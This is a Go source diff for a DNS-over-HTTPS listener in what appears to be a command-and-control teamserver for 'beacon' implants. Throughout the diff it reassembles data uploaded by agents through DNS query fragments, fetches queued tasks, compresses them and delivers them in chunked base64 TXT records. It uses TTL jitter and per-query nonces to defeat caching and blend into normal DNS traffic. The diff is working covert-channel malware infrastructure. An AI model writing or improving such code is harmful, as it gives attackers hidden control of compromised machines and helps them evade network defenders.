@@ -30,8 +30,10 @@ type dohFragBuf struct {
 	total       uint32
 	buf         []byte
 	filled      uint32
+	highWater   uint32 // highest contiguous offset received (for idempotent handling)
 	expectedOff uint32 // expected next offset for gap detection
 	lastUpdate  time.Time
+	seenOffsets map[uint32]bool // track seen offsets to prevent duplicate counting
 }
 
 type dohDownBuf struct {
@@ -57,6 +59,7 @@ type DoHListener struct {
 	mu        sync.Mutex
 	upFrags   map[string]*dohFragBuf
 	downFrags map[string]*dohDownBuf
+	rng       *rand.Rand
 }
 
 func (d *DoHListener) Start(ts Teamserver) error {
@@ -67,8 +70,8 @@ func (d *DoHListener) Start(ts Teamserver) error {
 		d.Config.PktSize = 1024
 	}
 
-	// Seed the random number generator for TTL jitter
-	rand.Seed(time.Now().UnixNano())
+	// Initialize local RNG for TTL jitter (avoid deprecated global seed)
+	d.rng = rand.New(rand.NewSource(time.Now().UnixNano()))
 
 	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))
 
@@ -97,9 +100,40 @@ func (d *DoHListener) Start(ts Teamserver) error {
 		}
 	}()
 
+	// Start cleanup goroutine for stale fragments
+	go d.cleanupStaleFragments()
+
 	time.Sleep(200 * time.Millisecond)
 	d.Active = true
 	return nil
+}
+
+// cleanupStaleFragments periodically removes incomplete upload fragments
+// that haven't been updated for a long time (likely due to DNS packet loss)
+func (d *DoHListener) cleanupStaleFragments() {
+	ticker := time.NewTicker(60 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		if !d.Active {
+			return
+		}
+
+		now := time.Now()
+		staleTimeout := 5 * time.Minute // Fragments older than 5 minutes are considered stale
+
+		d.mu.Lock()
+		for sid, fb := range d.upFrags {
+			if now.Sub(fb.lastUpdate) > staleTimeout {
+				if dohDebug {
+					fmt.Printf("[BeaconDoH-DNS] [CLEANUP] Removing stale upload fragment | sid=%s | filled=%d/%d | age=%v\n",
+						sid, fb.filled, fb.total, now.Sub(fb.lastUpdate))
+				}
+				delete(d.upFrags, sid)
+			}
+		}
+		d.mu.Unlock()
+	}
 }
 
 func (d *DoHListener) Stop() error {
@@ -137,6 +171,10 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 
 	const maxUploadSize = 4 << 20 // 4MB 上行限制
 	if total == 0 || total > maxUploadSize {
+		if dohDebug {
+			fmt.Printf("[BeaconDoH-DNS] [UP] OVERSIZE bypass | sid=%s total=%d offset=%d frame_len=%d limit=%d\n",
+				sid, total, offset, len(data), maxUploadSize)
+		}
 		_ = d.ts.TsAgentProcessData(sid, data)
 		return
 	}
@@ -152,14 +190,22 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 	defer d.mu.Unlock()
 
 	fb, ok := d.upFrags[key]
-	if !ok || fb.total != total || (offset == 0 && fb.filled > 0) {
+	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
 		// 新一轮上行会话：
 		//  - 第一次看到该 sid（!ok），或者
 		//  - total 发生变化（协议版本/任务大小变化），或者
 		//  - offset 回到 0 但之前已经有填充的数据（重传/新任务覆盖旧任务）。
 		// 为避免不同任务之间的缓冲区污染，始终重新分配缓冲并重置填充进度。
 		buf := make([]byte, total)
-		fb = &dohFragBuf{total: total, buf: buf, expectedOff: 0, lastUpdate: time.Now()}
+		fb = &dohFragBuf{
+			total:       total,
+			buf:         buf,
+			filled:      0,
+			highWater:   0,
+			expectedOff: 0,
+			lastUpdate:  time.Now(),
+			seenOffsets: make(map[uint32]bool),
+		}
 		d.upFrags[key] = fb
 		if dohDebug {
 			fmt.Printf("[BeaconDoH-DNS] [UP] New upload session | sid=%s | total=%d bytes\n", sid, total)
@@ -170,6 +216,15 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 			fmt.Printf("[BeaconDoH-DNS] [UP] WARN: offset %d >= total %d | sid=%s\n", offset, fb.total, sid)
 		}
 		return
+	}
+
+	// IDEMPOTENT: Check if we've already processed this offset
+	// This handles duplicate packets from multiple DNS resolvers
+	if fb.seenOffsets[offset] {
+		if dohDebug {
+			fmt.Printf("[BeaconDoH-DNS] [UP] DUPLICATE offset=%d ignored | sid=%s\n", offset, sid)
+		}
+		return // Already processed, ignore duplicate
 	}
 
 	// Gap detection: check if we received out-of-order
@@ -185,9 +240,17 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 	}
 	n := end - offset
 	copy(fb.buf[offset:end], chunk[:n])
+
+	// Mark this offset as seen (idempotent)
+	fb.seenOffsets[offset] = true
 	fb.filled += n
 	fb.expectedOff = end // update expected next offset
 	fb.lastUpdate = time.Now()
+
+	// Update high water mark
+	if end > fb.highWater {
+		fb.highWater = end
+	}
 
 	if dohDebug {
 		progress := float64(fb.filled) * 100.0 / float64(fb.total)
@@ -198,6 +261,8 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 	if fb.filled >= fb.total {
 		if dohDebug {
 			fmt.Printf("[BeaconDoH-DNS] [UP] Reassembly Complete! sid=%s | Total: %d bytes\n", sid, fb.total)
+			fmt.Printf("[BeaconDoH-DNS] [UP] Summary | sid=%s total=%d filled=%d highWater=%d unique_offsets=%d\n",
+				sid, fb.total, fb.filled, fb.highWater, len(fb.seenOffsets))
 		}
 		_ = d.ts.TsAgentProcessData(sid, fb.buf)
 		delete(d.upFrags, key)
@@ -218,7 +283,7 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 	if baseTTL == 0 {
 		baseTTL = 10
 	}
-	ttl := baseTTL + uint32(rand.Intn(60))
+	ttl := baseTTL + uint32(d.rng.Intn(60))
 
 	// 记录请求的 Qtype，用于区分 A 心跳和 TXT 下行
 	reqQType := dns.TypeTXT
@@ -393,18 +458,18 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				_ = d.ts.TsAgentSetTick(sid)
 			}
 
-			// ACK mechanism: parse ack_offset from dataB
-			// APT format: [ackOffset:4][nonce:4] = 8 bytes
-			var ackOffset uint32 = 0
-			var ackNonce uint32 = 0
+			// Parse requested offset from dataB (agent sends [offset:4][nonce:4])
+			// APT format: [offset:4][nonce:4] = 8 bytes
+			var reqOffset uint32 = 0
+			var reqNonce uint32 = 0
 			if len(dataB) >= 4 {
-				ackOffset = binary.BigEndian.Uint32(dataB[0:4])
+				reqOffset = binary.BigEndian.Uint32(dataB[0:4])
 			}
 			if len(dataB) >= 8 {
-				ackNonce = binary.BigEndian.Uint32(dataB[4:8])
+				reqNonce = binary.BigEndian.Uint32(dataB[4:8])
 			}
-			if dohDebug && ackOffset > 0 {
-				fmt.Printf("[BeaconDoH-DNS] [ACK] ack=%d nonce=%08x | sid=%s\n", ackOffset, ackNonce, sid)
+			if dohDebug && reqOffset > 0 {
+				fmt.Printf("[BeaconDoH-DNS] [ACK] req_off=%d nonce=%08x | sid=%s\n", reqOffset, reqNonce, sid)
 			}
 
 			var df *dohDownBuf
@@ -412,12 +477,12 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				d.mu.Lock()
 				if buf, ok := d.downFrags[sid]; ok {
 					df = buf
-					// Apply ACK: if ackOffset is within valid range and greater than current off, update it
-					if ackOffset > 0 && ackOffset <= df.total && ackOffset > df.off {
+					// Track agent progress inferred from requested offset
+					if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
 						if dohDebug {
-							fmt.Printf("[BeaconDoH-DNS] [ACK] Advancing offset from %d to %d (sid=%s)\n", df.off, ackOffset, sid)
+							fmt.Printf("[BeaconDoH-DNS] [ACK] Advancing offset from %d to %d (sid=%s)\n", df.off, reqOffset, sid)
 						}
-						df.off = ackOffset
+						df.off = reqOffset
 					}
 				}
 				d.mu.Unlock()
@@ -461,6 +526,9 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						buf[4] = byte((origLen >> 24) & 0xFF)
 						copy(buf[5:], payload)
 						df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
+						if dohDebug {
+							fmt.Printf("[BeaconDoH-DNS] [DOWN] Prepared task | sid=%s orig=%d flags=%d framed=%d\n", sid, origLen, flags, len(buf))
+						}
 
 						d.mu.Lock()
 						d.downFrags[sid] = df
@@ -470,117 +538,79 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 
 			var frame []byte
+			if df != nil {
+				// APT DESIGN: dataB contains [offset:4][nonce:4]
+				// Nonce makes each query unique (anti-caching), we only use offset
+				requestedOffset := reqOffset
+				nonce := reqNonce
+				if requestedOffset >= df.total {
+					requestedOffset = 0
+				}
+				if dohDebug {
+					fmt.Printf("[BeaconDoH-DNS] [DOWN] offset=%d nonce=%08x | sid=%s\n", requestedOffset, nonce, sid)
+				}
 
-			if reqQType == dns.TypeA {
-				// NEW DESIGN: Use ackOffset from heartbeat to detect completion.
-				// When agent finishes download, it resets downFilled to 0 and sends ackOffset=0.
-				// But before that, it will have sent ackOffset >= total indicating completion.
-				d.mu.Lock()
-				if oldDf, ok := d.downFrags[sid]; ok {
-					// If agent's ackOffset >= total, they've received everything
-					if ackOffset >= oldDf.total {
-						delete(d.downFrags, sid)
-						df = nil // Clear local reference too
-						if dohDebug {
-							fmt.Printf("[BeaconDoH-DNS] [ACK] Task complete | sid=%s ackOffset=%d >= total=%d\n", sid, ackOffset, oldDf.total)
+				if df.total > 0 {
+					maxChunk := d.Config.PktSize
+					isTCP := w.RemoteAddr().Network() == "tcp"
+
+					if !isTCP {
+						// DoH chunk size: 400 bytes binary = ~540 bytes Base64
+						// Most DoH resolvers can handle ~500-600 byte TXT responses over UDP.
+						// If truncation occurs, agent will detect offset mismatch and retry.
+						const dohSafeChunk = 400
+						if maxChunk <= 0 || maxChunk > dohSafeChunk {
+							maxChunk = dohSafeChunk
+						}
+					} else {
+						if maxChunk <= 0 {
+							maxChunk = 4096
 						}
 					}
-				}
-				d.mu.Unlock()
 
-				// hasTasks: check if there's pending data the agent hasn't ACK'd yet
-				hasTasks := (df != nil && df.total > 0 && ackOffset < df.total)
-				if hasTasks {
-					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
-					m.Answer = append(m.Answer, rr)
-				} else {
-					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
-					m.Answer = append(m.Answer, rr)
-				}
-			} else {
-				if df != nil {
-					// APT DESIGN: dataB contains [offset:4][nonce:4]
-					// Nonce makes each query unique (anti-caching), we only use offset
-					var requestedOffset uint32 = 0
-					var nonce uint32 = 0
-					if len(dataB) >= 4 {
-						requestedOffset = binary.BigEndian.Uint32(dataB[0:4])
+					remaining := df.total - requestedOffset
+					chunkLen := remaining
+					if chunkLen > uint32(maxChunk) {
+						chunkLen = uint32(maxChunk)
 					}
-					if len(dataB) >= 8 {
-						nonce = binary.BigEndian.Uint32(dataB[4:8])
-					}
-					if requestedOffset >= df.total {
-						requestedOffset = 0
-					}
+
+					frame = make([]byte, 8+chunkLen)
+					binary.BigEndian.PutUint32(frame[0:4], df.total)
+					binary.BigEndian.PutUint32(frame[4:8], requestedOffset)
+					copy(frame[8:], df.buf[requestedOffset:requestedOffset+chunkLen])
+
 					if dohDebug {
-						fmt.Printf("[BeaconDoH-DNS] [DOWN] offset=%d nonce=%08x | sid=%s\n", requestedOffset, nonce, sid)
+						fmt.Printf("[BeaconDoH-DNS] [DOWN] Sending Fragment | sid=%s | %d bytes (ReqOff: %d / Total: %d) | TCP: %v\n",
+							sid, chunkLen, requestedOffset, df.total, isTCP)
 					}
 
-					if df.total > 0 {
-						maxChunk := d.Config.PktSize
-						isTCP := w.RemoteAddr().Network() == "tcp"
-
-						if !isTCP {
-							// DoH chunk size: 400 bytes binary = ~540 bytes Base64
-							// Most DoH resolvers can handle ~500-600 byte TXT responses over UDP.
-							// If truncation occurs, agent will detect offset mismatch and retry.
-							const dohSafeChunk = 400
-							if maxChunk <= 0 || maxChunk > dohSafeChunk {
-								maxChunk = dohSafeChunk
-							}
-						} else {
-							if maxChunk <= 0 {
-								maxChunk = 4096
-							}
-						}
-
-						remaining := df.total - requestedOffset
-						chunkLen := remaining
-						if chunkLen > uint32(maxChunk) {
-							chunkLen = uint32(maxChunk)
-						}
-
-						frame = make([]byte, 8+chunkLen)
-						binary.BigEndian.PutUint32(frame[0:4], df.total)
-						binary.BigEndian.PutUint32(frame[4:8], requestedOffset)
-						copy(frame[8:], df.buf[requestedOffset:requestedOffset+chunkLen])
-
-						if dohDebug {
-							fmt.Printf("[BeaconDoH-DNS] [DOWN] Sending Fragment | sid=%s | %d bytes (ReqOff: %d / Total: %d) | TCP: %v\n",
-								sid, chunkLen, requestedOffset, df.total, isTCP)
-						}
-
-						// Don't update df.off - let agent control the flow
-					}
+					// Don't update df.off - let agent control the flow
 				}
+			}
 
-				if len(frame) == 0 {
-					if reqQType == dns.TypeA {
-						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
-						m.Answer = append(m.Answer, rr)
-					} else if reqQType == dns.TypeAAAA {
-						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::").To16()}
-						m.Answer = append(m.Answer, rr)
-					} else {
-						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
-						m.Answer = append(m.Answer, rr)
+			if len(frame) == 0 {
+				if dohDebug {
+					reason := "unknown"
+					if df == nil {
+						reason = "df_nil"
+					} else if df.total == 0 {
+						reason = "total_zero"
 					}
-				} else {
-					if reqQType != dns.TypeTXT {
-						// 目前只在 TXT 中承载下行数据
-					} else {
-						b64Str := base64.StdEncoding.EncodeToString(frame)
-						var chunks []string
-						for len(b64Str) > 255 {
-							chunks = append(chunks, b64Str[:255])
-							b64Str = b64Str[255:]
-						}
-						chunks = append(chunks, b64Str)
-
-						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: chunks}
-						m.Answer = append(m.Answer, rr)
-					}
+					fmt.Printf("[BeaconDoH-DNS] [DOWN] Empty TXT response | sid=%s reason=%s\n", sid, reason)
 				}
+				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
+				m.Answer = append(m.Answer, rr)
+			} else {
+				b64Str := base64.StdEncoding.EncodeToString(frame)
+				var chunks []string
+				for len(b64Str) > 255 {
+					chunks = append(chunks, b64Str[:255])
+					b64Str = b64Str[255:]
+				}
+				chunks = append(chunks, b64Str)
+
+				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: chunks}
+				m.Answer = append(m.Answer, rr)
 			}
 
 		case "HB":
@@ -599,7 +629,7 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				hbNonce = binary.BigEndian.Uint32(dataB[4:8])
 			}
 
-			// Check task completion and determine if there are pending tasks
+			// Check existing task and handle ACK
 			d.mu.Lock()
 			df, hasDf := d.downFrags[sid]
 			if hasDf && ackOffset >= df.total && df.total > 0 {
@@ -612,6 +642,56 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				}
 			}
 			d.mu.Unlock()
+
+			// If no pending task, try to fetch new tasks from Teamserver
+			if !hasDf || df == nil {
+				maxDataSize := d.Config.PktSize * 256
+				if maxDataSize <= 0 || maxDataSize > (4<<20) {
+					maxDataSize = 4 << 20
+				}
+				if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
+					if dohDebug {
+						fmt.Printf("[BeaconDoH-DNS] [HB] New tasks for sid=%s total=%d bytes\n", sid, len(p))
+					}
+					origLen := len(p)
+					flags := byte(0)
+					payload := p
+
+					const minCompressSize = 2048
+					if origLen > minCompressSize {
+						var zbuf bytes.Buffer
+						wz, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
+						if errW == nil {
+							if _, errC := wz.Write(p); errC == nil && wz.Close() == nil {
+								comp := zbuf.Bytes()
+								if len(comp) > 0 && len(comp) < origLen {
+									payload = comp
+									flags = 1
+								}
+							} else {
+								_ = wz.Close()
+							}
+						}
+					}
+
+					totalLen := 1 + 4 + len(payload)
+					buf := make([]byte, totalLen)
+					buf[0] = flags
+					buf[1] = byte(origLen & 0xFF)
+					buf[2] = byte((origLen >> 8) & 0xFF)
+					buf[3] = byte((origLen >> 16) & 0xFF)
+					buf[4] = byte((origLen >> 24) & 0xFF)
+					copy(buf[5:], payload)
+					df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
+					if dohDebug {
+						fmt.Printf("[BeaconDoH-DNS] [HB] Prepared task | sid=%s orig=%d flags=%d framed=%d\n", sid, origLen, flags, len(buf))
+					}
+
+					d.mu.Lock()
+					d.downFrags[sid] = df
+					d.mu.Unlock()
+				}
+			}
 
 			hasTasks := hasDf && df != nil && df.total > 0 && ackOffset < df.total
 			if dohDebug {
